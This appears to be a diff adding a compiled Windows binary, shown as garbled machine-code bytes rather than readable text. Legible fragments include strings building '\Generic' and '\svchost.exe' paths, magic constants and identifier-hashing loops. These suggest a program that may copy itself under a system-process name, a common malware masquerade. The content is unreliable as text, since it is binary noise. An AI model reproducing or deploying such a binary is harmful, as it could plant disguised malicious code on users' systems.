+ 7 *‰D$*  Ò*Ç$yp@ *  Ó*¡,¢@ *¬Ä‚ *ÿÐ*  —*ƒì*
+ û *‰EÔ* û ­*ƒ}Ôÿ*	 Ô*tM*  Õ*¡D@ *
+ 7 *‰D$*  Ñ*…„þÿÿ*  Ö*ƒÀ,*	  *‰$*à©€ ×*èoïÿÿ*  Ñ*…„þÿÿ*
+ 7 *‰D$*
+  û*‹EÔ*	  *‰$*  Ø*¡0¢@ *°Ä‚ *ÿÐ*  —*ƒì*
+  *…À*	 )*•À*
+ ) )*„À*	 Ù*uÃ*
+  û*‹EÔ*	  *‰$*  Ú*¡(¢@ *¨Ä‚ *ÿÐ*  G*ƒì* 7 Û*ÇD$€‘@ *  Ü*Ç$   *  Ý*¡H¢@ *ÈÄ‚ *ÿÐ*  —*ƒì* æ Û*ÇEô€‘@ *	 Þ*ëp*ÆË€  É*…Úûÿÿ*  ß*ƒÀ
+*
+  æ*‹Uô*
+ 7 *‰T$*	  *‰$*Ø¨ à*èz.  *  É*…Úûÿÿ*  ß*ƒÀ
+*  É*•Úûÿÿ*
+ 7 *‰T$*	  *‰$*È¨ á*èO.  *  É*…Úûÿÿ*  ß*ƒÀ
+* 4 S*ÇD$    *
+ 7 *‰D$*  â*Ç$`@ *  ã*¡¢@ *”Ä‚ *ÿÐ*  U*ƒì*
+  æ*‹Eô*	  *‰$*à¨ i*è6.  *
+ ÿ *‰EÈ*
+  ÿ*‹EÈ*  *ƒÀ* æ *Eô*
+  æ*‹Eô*  ÿ*¶ *
+ ) )*„À*	 ä*u†*  è*¡l¢@ *ìÄ‚ *ÿÐ* å *‰…Ôúÿÿ*  å*‹…Ôúÿÿ*  ê*=¥¥¥¥*	 æ*u*  å*‹…Ôúÿÿ*
+  *…À*	 æ*y*  *¸   *	 ç*ë*ëÌ€  S*¸    *
+ ) )*„À* è*„^  *  ü*Ç$€   *˜¨ _*è”-  *
+ é *‰EÄ* é S*ƒ}Ä * è*„E  * ê S*
+Ç…Üøÿÿ    * ˜ S*
+Ç…àøÿÿ    * ë S*
+Ç…äøÿÿ    * ì S*
+Ç…èøÿÿ    * í S*
+Ç…ìøÿÿ    * – S*
+Ç…ðøÿÿ    * î S*
+Ç…ôøÿÿ    * ï S*
+Ç…øøÿÿ    * ð S*
+Ç…üøÿÿ    * ñ S*
+Ç… ùÿÿ    * ò S*
+Ç…ùÿÿ    * ó S*
+Ç…ùÿÿ    * ô S*
+Ç…ùÿÿ    * õ S*
+Ç…ùÿÿ    * ö S*
+Ç…ùÿÿ    * ÷ S*
+Ç…ùÿÿ    *  ±*•ùÿÿ*  S*¸    *  Ø*¹    * > *‰×*	$ ò*ó«*  å*‹…Ôúÿÿ* ø *‰…Ðúÿÿ*  ø*‹…Ðúÿÿ*
+ 6 *‰D$* 4 ù*ÇD$p@ * 7 ã*ÇD$@   *  ”*…Üøÿÿ*	  *‰$*  Œ*¡ `@ * ¦ *ÿÐ*  ø*‹…Ðúÿÿ*  Ø*5ï¾­Þ*  *‰Â*  ø*‹…Ðúÿÿ*
+ 0 *‰T$*
+ 6 *‰D$* 4 ú*ÇD$‰p@ * 7 ü*ÇD$€   *
+  é*‹EÄ*	  *‰$*  Œ*¡ `@ * ¦ *ÿÐ*
+  é*‹EÄ*	  *‰$*à¨ i*è¢,  * û *‰…Ìúÿÿ*  ”*…Üøÿÿ*	  *‰$*à¨ i*èŽ,  * ü *‰…Èúÿÿ* ú S*ÇEì    * ý*é¹   *äÏ€ þ S*
+Ç…,øÿÿ    * ÿ S*
+Ç…0øÿÿ    * € S*
+Ç…4øÿÿ    *  S*
+Ç…8øÿÿ    * ‚ S*
+Ç…<øÿÿ    * ƒ S*
+Ç…@øÿÿ    * „ S*
+Ç…Døÿÿ    * … S*
+Ç…Høÿÿ    *
+  ú*‹Eì*
+ 6 *‰D$* 4 †*ÇD$›p@ * 7 Ø*ÇD$    *  ‡*…,øÿÿ*	  *‰$*  Œ*¡ `@ * ¦ *ÿÐ*  ü*‹…Èúÿÿ*  ·*ƒø*	 ˆ*w*  ü*‹…Èúÿÿ*	 ‰*ë*îÐ€  —*¸   *
+  ú*‹Uì*  ð*Áâ*  *‰Ñ*  ±*•ùÿÿ*
+  *Ê*
+ 4 *‰D$*  ‡*…,øÿÿ*
+ 7 *‰D$*	  *‰$* ¨ m*è‡+  * ú *ƒEì* ú ð*ƒ}ì* Š*Ž=ÿÿÿ*  ‚*•œùÿÿ*  S*¸    *  ã*¹@   * > *‰×*	$ ò*ó«*  ü*‹…Èúÿÿ*
+ 4 *‰D$*  ”*…Üøÿÿ*
+ 7 *‰D$*  ‚*…œùÿÿ*	  *‰$* ¨ m*èC+  *  û*‹…Ìúÿÿ*  ü*‹•Èúÿÿ*  ‚*œùÿÿ*
+  *Ê*
+ 4 *‰D$*
+  é*‹EÄ*
+ 7 *‰D$*	  *‰$* ¨ m*è+  *  ‚*…œùÿÿ*	  *‰$*à¨ i*èN+  * ‹ *‰…Äúÿÿ* Œ S*
+Ç…Àúÿÿ    * ý S*ÇEè    *	 *ë4*«Ò€  ‚*•œùÿÿ*
+  ý*‹Eè*
+  *Ð*  ÿ*¶ *  )*¶Ð*
+  ý*‹Eè*  ð*ƒà*  ð*Áà*  *‰Á*  ß*Óâ*  *‰Ð*  *‰Â*  Œ*‹…Àúÿÿ*
+  *1Ð* Œ *‰…Àúÿÿ* ý *ƒEè*  ‹*‹…Äúÿÿ* ý *9Eè*	% Ž*s* ý ò*ƒ}è*	 Ž*w*  *¸   *	 *ë*÷Ò€  S*¸    *
+ ) )*„À*	 *u«* 7 ã*ÇD$@   *  ”*…Üøÿÿ*	  *‰$*« å*èú+  *  —*ƒì* 7 ü*ÇD$€   *  ±*…ùÿÿ*	  *‰$*« å*èá+  *  —*ƒì* 7 É*ÇD$   *  ‚*…œùÿÿ*	  *‰$*« å*èÈ+  *  —*ƒì*
+  é*‹EÄ*	  *‰$*ˆ¨ “*è2*  *  ‘*…Dýÿÿ*
+ 7 *‰D$*  ’*Ç$¤p@ *  Ó*¡,¢@ *¬Ä‚ *ÿÐ*  —*ƒì*
+ ý *‰EÐ* ý ­*ƒ}Ðÿ* “*„£  *  ”*‹…Dýÿÿ*  Ô*ƒø* •*…]  *  í*…*ûÿÿ*
+ 7 *‰D$*  –*…Êûÿÿ*	  *‰$*Ø¨ à*è3*  *  ‘*…Dýÿÿ*  Ö*ƒÀ,*
+ 7 *‰D$*  –*…Êûÿÿ*	  *‰$*È¨ á*è*  *  –*…Êûÿÿ*
+ 7 *‰D$*  —*…ûÿÿ*	  *‰$*Ø¨ à*è *  *  –*…Êûÿÿ*
+ 7 *‰D$*  ˜*…
+ûÿÿ*	  *‰$*Ø¨ à*èè)  *  —*…ûÿÿ*	  *‰$*à¨ i*èâ)  *
+ ÿ *‰EÈ*  —*•ûÿÿ*
+  ÿ*‹EÈ*
+  *Ð*  ™*Ç \*.** š S*Æ@ *  ›*…üÿÿ*
+ 7 *‰D$*  —*…ûÿÿ*	  *‰$*  Ó*¡,¢@ *¬Ä‚ *ÿÐ*  —*ƒì*
+ þ *‰EÌ* þ ­*ƒ}Ìÿ* •*„ª   *  ˜*…
+ûÿÿ*
+ 7 *‰D$*  –*…Êûÿÿ*	  *‰$*Ø¨ à*è€)  *  –*…Êûÿÿ*	  *‰$*à¨ i*èz)  *
+ ÿ *‰EÈ*  –*•Êûÿÿ*
+  ÿ*‹EÈ*
+  *Ð* ÿ œ*Æ \*
+  ÿ*‹EÈ*  *ƒÀ*  S*Æ„Êûÿÿ *  ›*…üÿÿ*  Ö*ƒÀ,*
+ 7 *‰D$*  –*…Êûÿÿ*	  *‰$*È¨ á*è()  *  –*…Êûÿÿ*	  *‰$*  ž*¡ ¢@ * Ä‚ *ÿÐ*  G*ƒì*  ›*…üÿÿ*
+ 7 *‰D$*
+  þ*‹EÌ*	  *‰$*  Ø*¡0¢@ *°Ä‚ *ÿÐ*  —*ƒì*
+  *…À*	 )*•À*
+ ) )*„À* Ÿ*…fÿÿÿ*
+  þ*‹EÌ*	  *‰$*  Ú*¡(¢@ *¨Ä‚ *ÿÐ*  G*ƒì*  ‘*…Dýÿÿ*
+ 7 *‰D$*
+  ý*‹EÐ*	  *‰$*  Ø*¡0¢@ *°Ä‚ *ÿÐ*  —*ƒì*
+  *…À*	 )*•À*
+ ) )*„À*  *…mþÿÿ*
+  ý*‹EÐ*	  *‰$*  Ú*¡(¢@ *¨Ä‚ *ÿÐ*  G*ƒì*  «*¡<¢@ *¼Ä‚ *ÿÐ*	  *‰$*  ¬*¡X¢@ *ØÄ‚ *ÿÐ*  G*ƒì*  ­*ƒøÿ*	# )*”À*
+ ) )*„À* ¡*„_ùÿÿ* ¢ S*
+Ç…løÿÿ    * £ S*
+Ç…pøÿÿ    * ¤ S*
+Ç…tøÿÿ    * ¥ S*
+Ç…xøÿÿ    * ¦ S*
+Ç…|øÿÿ    * § S*
+Ç…€øÿÿ    * ¨ S*
+Ç…„øÿÿ    * © S*
+Ç…ˆøÿÿ    * ª S*
+Ç…Œøÿÿ    * « S*
+Ç…øÿÿ    * ¬ S*
+Ç…”øÿÿ    * ­ S*
+Ç…˜øÿÿ    * ® µ*
+Ç…¼úÿÿÅ* ¯ S*
+Ç…¸úÿÿ    * ° S*ÇEä    *	 ±*ë*ØØ€  °*‹Eä*  ²*ºžÿÿÿ*  *¯Â*  ³*P7*  ´*løÿÿ*
+  °*‹Eä*
+  *È*
+ ÿ á*ˆ* ° *ƒEä* ° µ*ƒ}ä/*	 ¶*~Û* f S*ÇEà    *	 ·*ëX*†Ù€  ´*•løÿÿ*	  f*‹Eà*
+  *Ð*  ÿ*¶ *  )*¶Ð*  ®*‹…¼úÿÿ*
+  *1Ð* ® *‰…¼úÿÿ*  ®*‹…¼úÿÿ*   ¸*iÀ“ * ® *‰…¼úÿÿ*  ®*‹•¼úÿÿ*	  f*‹Eà*  }*ƒà*  *‰Á*  ß*Óê*  *‰Ð*  )*¶Ð*  ¯*‹…¸úÿÿ*
+  *1Ð* ¯ *‰…¸úÿÿ* f *ƒEà* f µ*ƒ}à/*	 ¸*~¢* ¹ S*
+Ç…´úÿÿ    * º }*
+Ç…°úÿÿ   * c S*ÇEÜ    *	 »*ë,*Ú€  ¹*‹•´úÿÿ*  º*‹…°úÿÿ*  *¯Ð*	  c*‹EÜ*  µ*ƒà/*  ¼*¶„løÿÿ*  )*¶À*
+  *Ð* ¹ *‰…´úÿÿ* c *ƒEÜ* c }*ƒ}Ü*	 ½*~Î* ¾ ê*
+Ç…¬úÿÿ¥¥¥¥*  è*¡l¢@ *ìÄ‚ *ÿÐ* ¿ *‰…¨úÿÿ* e S*ÇEØ    *	 À*ëW*ÓÚ€ @ ¿*‹¨úÿÿ*	  e*‹UØ*  *‰Ð*  *Áà*
+  *Ð*  *‰Á* @ ß*Óë*  @*‰Ú*  ¾*‹…¬úÿÿ*
+  *1Ð* ¾ *‰…¬úÿÿ*  ¾*‹…¬úÿÿ*  À*Å    *  ¾*‹…¬úÿÿ*  Á*Áè*
+  *	Ð* ¾ *‰…¬úÿÿ*  ¾*‹…¬úÿÿ*  Ø*5ï¾­Þ* ¾ *‰…¬úÿÿ* e *ƒEØ* e Û*ƒ}Ø*	 Â*~£*  ®*‹•¼úÿÿ*  ¹*‹…´úÿÿ*
+  *1Â*  ¾*‹…¬úÿÿ*
+  *1Â*  ¯*‹…¸úÿÿ*
+  *1Ð* Ã *‰…¤úÿÿ*  Ã*‹…¤úÿÿ*  Ä*%ÿÿÿ* Å *‰… úÿÿ* Æ S*
+Ç…Løÿÿ    * Ç S*
+Ç…Pøÿÿ    * È S*
+Ç…Tøÿÿ    * É S*
+Ç…Xøÿÿ    * Ê S*
+Ç…\øÿÿ    * Ë S*
+Ç…`øÿÿ    * Ì S*
+Ç…døÿÿ    * Í S*
+Ç…høÿÿ    *  Ã*‹…¤úÿÿ*
+ 6 *‰D$* 4 Î*ÇD$§p@ * 7 Ø*ÇD$    *  Ï*…Løÿÿ*	  *‰$*  Œ*¡ `@ * ¦ *ÿÐ*  Ï*…Løÿÿ*	  *‰$*à¨ i*èó%  * Ð *‰…œúÿÿ* 7 Ñ*ÇD$0   *  ´*…løÿÿ*	  *‰$*« å*è'  *  —*ƒì* 7 Ø*ÇD$    *  Ï*…Løÿÿ*	  *‰$*« å*èî&  *  —*ƒì* ¡*éxöÿÿ*¬Ý€	  *U*   *‰å*	 @*S*  Ò*ì  * Ó *
+Ç…¸þÿÿ   * Ô ·*
+Ç…´þÿÿ   *  Ô*‹…´þÿÿ*  j*P*  Ô*‹…´þÿÿ*  *¯Â*  *ƒà*
+  *…À*	 )*•À*
+ ) )*„À* Õ*„â  * Ù S*
+Ç…œþÿÿ    *  Ö*…ýÿÿ*	  *‰$*  º*¡h¢@ *èÄ‚ *ÿÐ*  G*ƒì*  ×*… þÿÿ*	  *‰$*  À*¡D¢@ *ÄÄ‚ *ÿÐ*  G*ƒì* æ S*ÇEô    *	 Ø*ëI*¥Þ€  æ*‹Eô*  *‰Â*  *‰Ð*
+  *À*
+  *Ð*  ·*ƒÀ*  *‰Á*  Ù*•ôýÿÿ*
+  æ*‹Eô*
+  *Ð*
+ ÿ ß*ˆ*  Ù*•ôýÿÿ*
+  æ*‹Eô*
+  *Ð*  ÿ*¶ *  )*¾Ð*
+  æ*‹Eô*
+  *À*  *‰Á*  ß*Óâ*  Ù*‹…œþÿÿ*
+  *1Ð* Ù *‰…œþÿÿ* æ *ƒEô* æ ð*ƒ}ô*	 Ú*~±* Ý ã*
+Ç…˜þÿÿ@   * é ã*
+Ç…”þÿÿ@   *  Û*…˜þÿÿ* Ü *‰D$*  Ý*…týÿÿ*	  *‰$*  Ì*¡ ¢@ *€Ä‚ *ÿÐ*  —*ƒì*
+  *…À*	 )*•À*
+ ) )*„À*	 Þ*t<* ° S*ÇEð    *	 ß*ë-*·ß€  Ý*•týÿÿ*
+  °*‹Eð*
+  *Ð*  ÿ*¶ *  )*¾Ð*
+  °*‹Eð*  *Áà*  *‰Á*  ß*Óâ*  Ù*‹…œþÿÿ*
+  *1Ð* Ù *‰…œþÿÿ* ° *ƒEð* ° *ƒ}ð*	 à*~Í*  á*…”þÿÿ* Ü *‰D$*  â*…´ýÿÿ*	  *‰$*  Ñ*¡8¢@ *¸Ä‚ *ÿÐ*  —*ƒì*
+  *…À*	 )*•À*
+ ) )*„À*	 ã*tC* ú S*ÇEì    *	 ä*ë4*™à€  â*•´ýÿÿ*
+  ú*‹Eì*
+  *Ð*  ÿ*¶ * @ )*¾Ø*
+  ú*‹Uì*  *‰Ð*
+  *À*
+  *Ð*
+  *À*  *‰Á* @ ß*Óã*  @*‰Ú*  Ù*‹…œþÿÿ*
+  *1Ð* Ù *‰…œþÿÿ* ú *ƒEì* ú *ƒ}ì*	 å*~Æ* û µ*
+Ç…þÿÿÅ* ý S*ÇEè    *	 æ*ëC*æà€  ý*‹Eè*   ç*iÐª   *  û*‹…þÿÿ*
+  *1Ð* û *‰…þÿÿ*  û*‹…þÿÿ*   ¸*iÀ“ * û *‰…þÿÿ*  û*‹…þÿÿ*  *‰Â*  Ù*‹…œþÿÿ*
+  *Ð* Ù *‰…œþÿÿ* ý *ƒEè* ý *ƒ}è*	 è*~·*  Ù*‹…œþÿÿ* Ü ü*ÇD$€   *  Ù*…ôýÿÿ*	  *‰$*« å*èÅ$  *  —*ƒì* Ü é*ÇD$  *  ê*…Àþÿÿ*	  *‰$*  ë*¡d¢@ *äÄ‚ *ÿÐ*  —*ƒì*  ê*…Àþÿÿ*	  *‰$*à¨ i*èi#  *
+ ÿ *‰EÈ*  ê*•Àþÿÿ*
+  ÿ*‹EÈ*
+  *Ð*  ì*Ç \Gen* C í*Ç@eric* î S*Æ@ * Ü S*ÇD$    *  ê*…Àþÿÿ*	  *‰$*  ï*¡¢@ *˜Ä‚ *ÿÐ*  —*ƒì*  ê*…Àþÿÿ*	  *‰$*à¨ i*è!#  *
+ ÿ *‰EÈ*  ê*•Àþÿÿ*
+  ÿ*‹EÈ*
+  *Ð*  ð*Ç \svc* C ñ*Ç@host* ò ó*Ç@.exe* ô S*Æ@ * õ S*ÇD$    *  ê*…Àþÿÿ* Ü *‰D$*
+  *‹E*	  *‰$*  ã*¡¢@ *”Ä‚ *ÿÐ*  U*ƒì*  è*¡l¢@ *ìÄ‚ *ÿÐ* È *‰…°þÿÿ*  È*‹…°þÿÿ*  ê*=¥¥¥¥*	 ö*u*  È*‹…°þÿÿ*
+  *…À*	 ö*y*  *¸   *	 ÷*ë*²ã€  S*¸    *
+ ) )*„À* ø*„  * î µ*
+Ç…ŒþÿÿÅ* € S*
+Ç…ˆþÿÿ    * ° S*ÇEä    *	 ù*ë*Üã€  °*‹Eä*  ú*ºU   *  *¯Â*  û*P*  ü*4ýÿÿ*
+  °*‹Eä*
+  *È*
+ ÿ á*ˆ* ° *ƒEä* ° ¼*ƒ}ä*	 ý*~Û* f S*ÇEà    *	 þ*ë^*Šä€  ü*•4ýÿÿ*	  f*‹Eà*
+  *Ð*  ÿ*¶ *  )*¶Ð*  î*‹…Œþÿÿ*
+  *1Ð* î *‰…Œþÿÿ*  î*‹…Œþÿÿ*   ¸*iÀ“ * î *‰…Œþÿÿ*  ü*•4ýÿÿ*	  f*‹Eà*
+  *Ð*  ÿ*¶ *  )*¶Ð*	  f*‹Eà*  ð*ƒà*  *‰Á*  ß*Óâ*  €*‹…ˆþÿÿ*
+  *1Ð* € *‰…ˆþÿÿ* f *ƒEà* f ·*ƒ}à*	 ÿ*~œ*  S*
+Ç…„þÿÿ    * c S*ÇEÜ    *	 €*ëI*å€  *‹…„þÿÿ*   *iÀmNÆA*  ‚*90  *  *‰…„þÿÿ*  *‹•„þÿÿ*  €*‹…ˆþÿÿ*
+  *1Ð* € *‰…ˆþÿÿ*  €*‹…ˆþÿÿ*  ƒ* *  €*‹…ˆþÿÿ*  }*Áè*
+  *	Ð* € *‰…ˆþÿÿ* c *ƒEÜ* c Û*ƒ}Ü*	 „*~±* e S*ÇEØ    *	 …*ën*Ùå€  ü*•4ýÿÿ*	  e*‹EØ*
+  *Ð*  ÿ*¶*	  e*‹EØ*  †*¹ªÿÿÿ*  *¯Á*
+  *1Â*  ü*4ýÿÿ*	  e*‹EØ*
+  *È*
+ ÿ á*ˆ*  ü*•4ýÿÿ*	  e*‹EØ*
+  *Ð*  ÿ*¶ *	  e*‹UØ*
+  *Ð*  ‡*P*  ü*4ýÿÿ*	  e*‹EØ*
+  *È*
+ ÿ á*ˆ*  ü*•4ýÿÿ*	  e*‹EØ*
+  *Ð*  ÿ*¶ *  )*¶Ð*  €*‹…ˆþÿÿ*
+  *Ð* € *‰…ˆþÿÿ* e *ƒEØ* e ð*ƒ}Ø*	 ˆ*~Œ* ‰ S*
+Ç…€þÿÿ    * û S*ÇEÔ    *	 Š*ëK*àæ€  ‰*‹•€þÿÿ*  *‰Ð*
+  *À*
+  *Ð*  ‹*H*  Œ*ºë*  *‰È* *÷ê*  *‰Ð*  ð*Áø*  *‰Ê*  }*Áú*
+  *)Ð*   *kÐa*  *‰È*
+  *)Ð* ‰ *‰…€þÿÿ*  ‰*‹…€þÿÿ*  *‰Â*  €*‹…ˆþÿÿ*
+  *1Ð* € *‰…ˆþÿÿ* û *ƒEÔ* û *ƒ}Ô*	 Ž*~¯*  î*‹…Œþÿÿ*  €*‹…ˆþÿÿ* Ü ã*ÇD$@   *  ü*…4ýÿÿ*	  *‰$*« å*è½!  *  —*ƒì*  ¿*…¼þÿÿ*  *‰D$*  *ÇD$   * õ S*ÇD$    * Ü ‹*ÇD$´p@ *  ‘*Ç$  €*  ’*¡¢@ *ˆÄ‚ *ÿÐ*  “*ƒì*  ê*…Àþÿÿ*	  *‰$*à¨ i*èI   *  j*P*  ”*‹…¼þÿÿ* • *‰T$*  ê*•Àþÿÿ*  *‰T$*  *ÇD$   * õ S*ÇD$    * Ü –*ÇD$äp@ *	  *‰$*  —*¡¢@ *ŒÄ‚ *ÿÐ*  *ƒì*  ”*‹…¼þÿÿ*	  *‰$*  ˜*¡¢@ *„Ä‚ *ÿÐ*  G*ƒì*  ¿*…¼þÿÿ*  *‰D$*  *ÇD$   * õ S*ÇD$    * Ü ™*ÇD$q@ *  ‘*Ç$  €*  ’*¡¢@ *ˆÄ‚ *ÿÐ*  “*ƒì*  ê*…Àþÿÿ*	  *‰$*à¨ i*è¹  *  j*P*  ”*‹…¼þÿÿ* • *‰T$*  ê*•Àþÿÿ*  *‰T$*  *ÇD$   * õ S*ÇD$    * Ü š*ÇD$>q@ *	  *‰$*  —*¡¢@ *ŒÄ‚ *ÿÐ*  *ƒì*  ”*‹…¼þÿÿ*	  *‰$*  ˜*¡¢@ *„Ä‚ *ÿÐ*  G*ƒì*  ¿*…¼þÿÿ*  *‰D$*  *ÇD$   * õ S*ÇD$    * Ü ›*ÇD$Pq@ *  ‘*Ç$  €*  ’*¡¢@ *ˆÄ‚ *ÿÐ*  “*ƒì*  ê*…Àþÿÿ*	  *‰$*à¨ i*è)  *  j*P*  ”*‹…¼þÿÿ* • *‰T$*  ê*•Àþÿÿ*  *‰T$*  *ÇD$   * õ S*ÇD$    * Ü œ*ÇD$„q@ *	  *‰$*  —*¡¢@ *ŒÄ‚ *ÿÐ*  *ƒì*  ”*‹…¼þÿÿ*	  *‰$*  ˜*¡¢@ *„Ä‚ *ÿÐ*  G*ƒì*  ¿*…¼þÿÿ*  *‰D$*  *ÇD$   * õ S*ÇD$    * Ü *ÇD$”q@ *  ‘*Ç$  €*  ’*¡¢@ *ˆÄ‚ *ÿÐ*  “*ƒì*  ê*…Àþÿÿ*	  *‰$*à¨ i*è™  *  j*P*  ”*‹…¼þÿÿ* • *‰T$*  ê*•Àþÿÿ*  *‰T$*  *ÇD$   * õ S*ÇD$    * Ü ž*ÇD$Êq@ *	  *‰$*  —*¡¢@ *ŒÄ‚ *ÿÐ*  *ƒì*  ”*‹…¼þÿÿ*	  *‰$*  ˜*¡¢@ *„Ä‚ *ÿÐ*  G*ƒì*  «*¡<¢@ *¼Ä‚ *ÿÐ*	  *‰$*  ¬*¡X¢@ *ØÄ‚ *ÿÐ*  G*ƒì*  ­*ƒøÿ*	# )*”À*
+ ) )*„À* Ÿ*„³  * é S*ÇEÄ    *  S*
+Ç…|þÿÿ    * ƒ S*
+Ç…xþÿÿ    *  ü*Ç$€   *˜¨ _*è¹  *
+ é *‰EÄ* é S*ƒ}Ä * Ÿ*„  *  è*¡l¢@ *ìÄ‚ *ÿÐ*  *‰D$* õ  *ÇD$Òq@ * Ü ü*ÇD$€   *
+  é*‹EÄ*	  *‰$*  Œ*¡ `@ * ¦ *ÿÐ*
+  é*‹EÄ*	  *‰$*à¨ i*èÁ  *  *‰…|þÿÿ*  *‹…|þÿÿ*  †*ƒø?*	! ¡**  *‹…|þÿÿ*	 ¢*ë*¸í€  †*¸?   *
+ 4 *‰D$*
+  é*‹EÄ*
+ 7 *‰D$*  Ý*…týÿÿ*	  *‰$* ¨ m*èJ  * £ S*Æ…³ýÿÿ * 4 Ø*ÇD$    * 7 ç*ÇD$ª   *  â*…´ýÿÿ*	  *‰$*¨¨ ¤*è-  * ý S*ÇEÐ    *	 ¥*ëX*„î€  Ý*…týÿÿ*
+ 7 *‰D$*  â*…´ýÿÿ*	  *‰$*Ø¨ à*è<  *  â*…´ýÿÿ*	  *‰$*à¨ i*è6  *  ƒ*‹•xþÿÿ*
+  *Ð* ƒ *‰…xþÿÿ*  â*•´ýÿÿ*
+  ý*‹EÐ*
+  *Ð*  ÿ*¶ *  ú*ƒðU*  *‰Â*  â*´ýÿÿ*
+  ý*‹EÐ*
+  *È*
+ ÿ á*ˆ* ý *ƒEÐ* ý *ƒ}Ð*	 ¦*~¢*  S*
+Ç…tþÿÿ    * þ S*ÇEÌ    *	 §*ë=*õî€  þ*‹EÌ*  Ý*•týÿÿ*
+  *Ð*  ÿ*¶ *  )*¶Ð*  *‹…tþÿÿ*
+  *1Ð*  *‰…tþÿÿ*  *‹…tþÿÿ*  ƒ* *  *‹…tþÿÿ*  }*Áè*
+  *	Ð*  *‰…tþÿÿ* þ *ƒEÌ* þ ·*ƒ}Ì*	 ¨*~½* 7 ü*ÇD$€   *
+  é*‹EÄ*	  *‰$*« å*èÅ  *  —*ƒì*
+  é*‹EÄ*	  *‰$*ˆ¨ “*è/  *  *‹…|þÿÿ*  ƒ*‹…xþÿÿ*  *‹…tþÿÿ*  ¿*…¼þÿÿ*  *‰D$*  *ÇD$   * õ S*ÇD$    * Ü ©*ÇD$äq@ *  ª*Ç$  €*  ’*¡¢@ *ˆÄ‚ *ÿÐ*  “*ƒì*  ”*‹…¼þÿÿ* ¯ G*ÇD$   *  «*•¸þÿÿ*
+ 0 *‰T$* 6 G*ÇD$   * 4 S*ÇD$    * 7 ¬*ÇD$r@ *	  *‰$*  —*¡¢@ *ŒÄ‚ *ÿÐ*  *ƒì*  ”*‹…¼þÿÿ*	  *‰$*  ˜*¡¢@ *„Ä‚ *ÿÐ*  G*ƒì*  ¿*…¼þÿÿ*
+ 0 *‰D$* 6 *ÇD$   * 4 S*ÇD$    * 7 ©*ÇD$äq@ *  ª*Ç$  €*  ’*¡¢@ *ˆÄ‚ *ÿÐ*  “*ƒì*  ”*‹…¼þÿÿ* ¯ G*ÇD$   *  «*•¸þÿÿ*
+ 0 *‰T$* 6 G*ÇD$   * 4 S*ÇD$    * 7 ­*ÇD$-r@ *	  *‰$*  —*¡¢@ *ŒÄ‚ *ÿÐ*  *ƒì*  ”*‹…¼þÿÿ*	  *‰$*  ˜*¡¢@ *„Ä‚ *ÿÐ*  G*ƒì***
+ @ Ü*‹]ü**É**Ã*øñ€	  *U*   *‰å*  *ƒì*
+  *‹E*	  *‰$*  ®*¡£@ *œÆ‚ *ÿÐ**É**Ã*ò€	  *U*   *‰å*	 @*S*  ¯*ìt  *  S*Ç$    *  °*¡P¢@ *ÐÄ‚ *ÿÐ*  G*ƒì*
+ é *‰EÄ* ± é*ÇD$  * ² â*ÇD$`@ *
+  é*‹EÄ*	  *‰$*  ³*¡L¢@ *ÌÄ‚ *ÿÐ*  U*ƒì*  â*Ç$`@ *¬Ý€ ´*èUõÿÿ* µ ”*ÆÆ•@ ** ¶ –*ÆÄ•@ B* · ”*ÆÅ•@ ** ¸ ·*ÇE    *
+  ¸*‹E *  j*P*
+  ¸*‹E *  *¯Â*  *ƒà*
+  *…À*	 )*•À*
+ ) )*„À* ¹*„¥  *  º*…´ùÿÿ*	  *‰$*  º*¡h¢@ *èÄ‚ *ÿÐ*  G*ƒì*  »*‹…¸ùÿÿ* ¼ *‰…Düÿÿ*  ½*‹…Ðùÿÿ* ¾ *‰…@üÿÿ*  ¿*‹…Èùÿÿ* À *‰…<üÿÿ*  Á*…,üÿÿ*	  *‰$*  À*¡D¢@ *ÄÄ‚ *ÿÐ*  G*ƒì*  Â*·…,üÿÿ* Ã Ã*f‰…*üÿÿ*  Ä*·….üÿÿ* Å Ã*f‰…(üÿÿ*  Æ*·…2üÿÿ* Ç Ã*f‰…&üÿÿ* È É*
+Ç… üÿÿ   *  É*… üÿÿ* ² *‰D$*  Ê*…ôùÿÿ*	  *‰$*  Ì*¡ ¢@ *€Ä‚ *ÿÐ*  —*ƒì*  Ë*¶…ôùÿÿ* Ì )*ˆ…üÿÿ* Í É*
+Ç…üÿÿ   *  Î*…üÿÿ* ² *‰D$*  •*…ôúÿÿ*	  *‰$*  Ñ*¡8¢@ *¸Ä‚ *ÿÐ*  —*ƒì* Ï S*
+Ç…üÿÿ    * æ S*ÇEô    *	 Ð*ë1*ñô€  •*•ôúÿÿ*
+  æ*‹Eô*
+  *Ð*  ÿ*¶ *  )*¾Ð*
+  æ*‹Eô*  ·*ƒà*  *‰Á*  ß*Óâ*  *‰Ð*  *‰Â*  Ï*‹…üÿÿ*
+  *1Ð* Ï *‰…üÿÿ* æ *ƒEô*  •*•ôúÿÿ*
+  æ*‹Eô*
+  *Ð*  ÿ*¶ *
+ ) )*„À*	 Ñ*u½*  ¼*‹•Düÿÿ*  ¾*‹…@üÿÿ*
+  *1Â*  À*‹…<üÿÿ*
+  *Â*  Ã*·…*üÿÿ*  Ã*·À*
+  *Â*  Å*·…(üÿÿ*  Ã*·À*
+  *Â*  Ç*·…&üÿÿ*  Ã*·À*
+  *Â*  Ï*‹…üÿÿ*
+  *Ð* Ò *‰…üÿÿ*  Ò*‹…üÿÿ* ² É*ÇD$   *  Ê*…ôùÿÿ*	  *‰$*« å*èx  *  —*ƒì* ² É*ÇD$   *  •*…ôúÿÿ*	  *‰$*« å*è_  *  —*ƒì* ² G*ÇD$   *  —*Ç$   *ì¯ ¨*è¤  *  *‰Â*  Ó*…¤þÿÿ* ² *‰T$*  â*Ç$`@ *  *‰Á*Œ† ª*èª  *  —*ƒì*  Ó*…¤þÿÿ* ± *ÇD$   *  S*Ç$    * ² S*ÇD$    *  *‰Á*¬† ¬*è£  *  U*ƒì*  Ô*…þÿÿ*  Ó*•¤þÿÿ*	  *‰$*  *‰Á*¤† ®*è‚  *  G*ƒì*  Ô*…þÿÿ*  *‰Á*Ø¯ ¯*è&  *
+ Õ *‰EÀ*  Ó*…¤þÿÿ* ² S*ÇD$    *  S*Ç$    * Ö S*ÇD$    *  *‰Á*¬† ¬*èS  *  U*ƒì*
+  Õ*‹EÀ*	  *‰$*˜¨ _*è1  * Õ *£D@ *  ×*‹D@ *  Ó*…¤þÿÿ*
